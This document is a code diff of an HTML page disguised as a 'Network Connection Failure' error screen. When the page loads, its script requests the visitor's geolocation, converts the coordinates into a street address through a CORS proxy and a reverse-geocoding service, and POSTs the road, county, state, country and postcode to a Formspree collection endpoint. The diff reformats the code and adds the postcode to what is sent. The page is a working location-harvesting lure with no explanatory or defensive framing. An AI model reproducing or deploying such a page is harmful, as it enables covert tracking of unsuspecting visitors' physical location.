@@ -1,70 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Network Failure</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 50px;
-      }
-      .failure-message {
-        color: rgb(69, 67, 67);
-        font-size: 24px;
-      }
- 
-    </style>
-  </head>
-  <body>
-    <div class="failure-message" id="failureMessage">Network Connection Failure</div>
 
-    <script>
-      // Check if geolocation is available
-      function getGeolocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            function (position) {
-              const latitude = position.coords.latitude;
-              const longitude = position.coords.longitude;
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Network Failure</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
 
-             
-              const proxyUrl = "https://cors-anywhere.herokuapp.com/";
-              const apiUrl = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
-              fetch(proxyUrl + apiUrl)
-                .then((response) => response.json())
-                .then((data) => {
-                  if (data && data.address) {
-                    const address = data.address;
-                   const formattedAddress = `${address.road}, ${address.city}, ${address.state}, ${address.country}`;
-                    const formspreeUrl = "https://formspree.io/f/xgvavavw"; 
+    .failure-message {
+      color: rgb(69, 67, 67);
+      font-size: 24px;
+    }
+  </style>
+</head>
 
-              // Send geolocation data to Formspree via POST request
-              fetch(formspreeUrl, {
-                method: "POST",
-                body: JSON.stringify({
-                  body: formattedAddress
-                }),
-              })
-                .then((response) => response.json())
-                .then((data) => {
-                  console.log("Location data sent:", data);
-                })
-                .catch((error) => console.error("Error sending location data:", error));
-            }
-                  }
-                })
-                .catch((error) => {
-                  console.error("Error fetching address:", error);
-                });
-             
-          );
-        } else {
-          console.log("Geolocation is not supported by this browser.");
-        }
+<body>
+  <div class="failure-message" id="failureMessage">Network Connection Failure</div>
+
+  <script>
+    // Check if geolocation is available
+    function getGeolocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+
+            const proxyUrl = "https://cors-anywhere.herokuapp.com/";
+            const apiUrl = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
+            fetch(proxyUrl + apiUrl)
+              .then((response) => response.json())
+              .then((data) => {
+                if (data && data.address) {
+                  const address = data.address;
+                  const formattedAddress = `${address.road}, ${address.county}, ${address.state}, ${address.country}, ${address.postcode}`;
+                  const formspreeUrl = "https://formspree.io/f/xgvavavw";
+
+                  fetch(formspreeUrl, {
+                    method: "POST",
+                    body: JSON.stringify({
+                      body: formattedAddress
+                    }),
+                  })
+                    .then((response) => response.json())
+                    .then((data) => {
+                      console.log("Location data sent:", data);
+                    })
+                    .catch((error) => console.error("Error sending location data:", error));
+                }
+              }
+              )
+              .catch((error) => {
+                console.error("Error fetching address:", error);
+              });
+
+          });
+      } else {
+        console.log("Geolocation is not supported by this browser.");
       }
-      window.onload = getGeolocation;
-    </script>
-  </body>
+    }
+    window.onload = getGeolocation;
+  </script>
+</body>
+
 </html>
